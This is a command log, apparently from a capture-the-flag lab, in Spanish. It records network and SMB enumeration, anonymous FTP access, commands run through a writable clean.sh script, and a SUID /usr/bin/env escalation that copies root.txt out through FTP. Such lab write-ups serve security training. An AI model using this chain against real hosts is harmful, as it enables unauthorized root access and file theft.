# Comandos ejecutados — LAB-017 Anonymous

## Reconocimiento

~~~~bash
nmap --top-ports 100 -sV -sC -oN nmap-inicial.txt 10.66.183.251
smbclient -L //10.66.183.251 -N
smbclient //10.66.183.251/pics -N -c 'ls'
~~~~

## Análisis de imágenes

~~~~bash
exiftool corgo2.jpg puppos.jpeg
steghide info corgo2.jpg
steghide info puppos.jpeg
~~~~

Steghide no extrajo datos al probar una frase vacía.

## FTP

~~~~text
ftp 10.66.183.251
Name: anonymous
ls -la
cd scripts
get to_do.txt
get clean.sh
get removed_files.log
get corgo2.jpg
get puppos.jpeg
~~~~

## Inventario delegado a clean.sh

~~~~bash
id
sudo -n -l
find / -type f -perm -4000 2>/dev/null
~~~~

Resultado: uid 1000 namelessone; sudo requería contraseña; /usr/bin/env tenía SUID.

## Lectura de root.txt

~~~~bash
/usr/bin/env /bin/bash -p -c "cp /root/root.txt /var/ftp/scripts/root_flag.txt && chmod 644 /var/ftp/scripts/root_flag.txt"
~~~~

El archivo se descargó por FTP. Se omite su contenido. Esta evidencia confirma la lectura privilegiada de root.txt; no una shell interactiva root.
